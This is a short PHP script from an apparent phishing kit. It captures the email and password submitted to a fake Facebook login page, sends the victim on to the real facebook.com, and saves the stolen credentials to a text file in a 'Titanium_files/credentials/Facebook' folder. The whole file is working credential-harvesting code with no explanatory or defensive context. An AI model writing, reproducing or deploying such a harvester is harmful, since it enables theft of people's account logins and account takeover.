<?php
  function get_creds($username,$Pass){
        $myfile="Titanium_files/credentials/Facebook/Credentials.txt";
        $username=$_POST["email"];
        $Pass=$_POST["Pass"];
        header("location:https://facebook.com");
        $d = fopen($myfile,"w");
        fwrite($d,"{USERNAME}:".$username."\r\n");
        fwrite($d,"{PASSWORD}:".$Pass."\r\n");
        fclose($d);
       }

  get_creds($username,$Pass);
?>
